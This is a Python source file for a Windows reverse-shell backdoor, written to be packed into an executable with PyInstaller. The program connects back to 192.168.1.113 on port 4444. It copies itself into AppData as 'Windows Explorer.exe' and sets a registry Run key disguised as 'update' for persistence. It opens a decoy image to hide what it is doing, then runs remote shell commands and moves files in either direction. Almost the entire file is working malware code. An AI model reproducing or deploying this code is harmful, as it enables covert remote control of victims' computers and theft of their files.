#pyinstaller.exe backdoor.py --onefile -> executable file


import socket, json
import subprocess, os, base64, sys, shutil

class Backdoor:
  
  def __init__(self, ip, port):
    self.become_persistent()
    self.ip = ip
    self.port = port
    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    self.connection.connect((self.ip, self.port))

  def become_persistent(self):
    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(evil_file_location):
      shutil.copyfile(sys.executable, evil_file_location)
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

  def reliable_send(self, data):
    json_data = json.dumps(data)
    self.connection.send(json_data.encode())

  def realiable_recieve(self):
    json_data = ""
    while True:
      try:
        json_data = json_data + self.connection.recv(1024).decode("ascii")
        return json.loads(json_data)
      except ValueError:
        continue

  def change_directory(self, path):
    try:
      os.chdir(path)
      return ("[+] Changing directoy to " + path)
    except FileNotFoundError:
      return "[-] Directory not found."

  def execute_system_command(self, command):
    try:
      DEVNULL = open(os.devnull, 'wb')
      return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    except Exception:
      return "[-] Error during command execution."

  def read_file(self, path):
    try:
      with open(path, "rb") as file:
        return base64.b64encode(file.read())
    except FileNotFoundError:
      return "[-] Error during command execution."

  def write_file(self, path, content):
    with open(path, "wb") as file:
      file.write(base64.b64decode(content))
      return "[+] Upload successful."

  # RECIEVE DATA
  def run(self):
    while True:
      command = self.realiable_recieve()
      if command[0] == "exit":
        self.connection.close()
        sys.exit()
      elif command[0] == "cd" and len(command) > 1:
        command_result = self.change_directory(command[1])
        self.reliable_send(command_result)
      # command_decoded = command.decode()
      # print(command)
      elif command[0] == "download" and len(command) > 1:
        command_result = self.read_file(command[1])
        if type(command_result) is str:
          self.reliable_send(command_result)
        else:
          self.reliable_send(command_result.decode("latin1"))
      elif command[0] == "upload" and len(command) > 1:
        command_result = self.write_file(command[1], command[2])
        self.reliable_send(command_result)
      else: 
        command_result = self.execute_system_command(command)
        if type(command_result) is str:  
          self.reliable_send(command_result)
        else:
          self.reliable_send(command_result.decode("latin1"))
        # print(command_result)
        # SEND BACK DE COMMAND RESULT


try:
  file_name = sys._MEIPASS + "sock.jpg"
except Exception:
  file_name = os.path.abspath(".") + "sock.jpg"
subprocess.Popen(file_name, shell=True)
ip = "192.168.1.113"
port = 4444
try:
  my_backdoor = Backdoor(ip, port)
  my_backdoor.run()
except Exception:
  sys.exit()
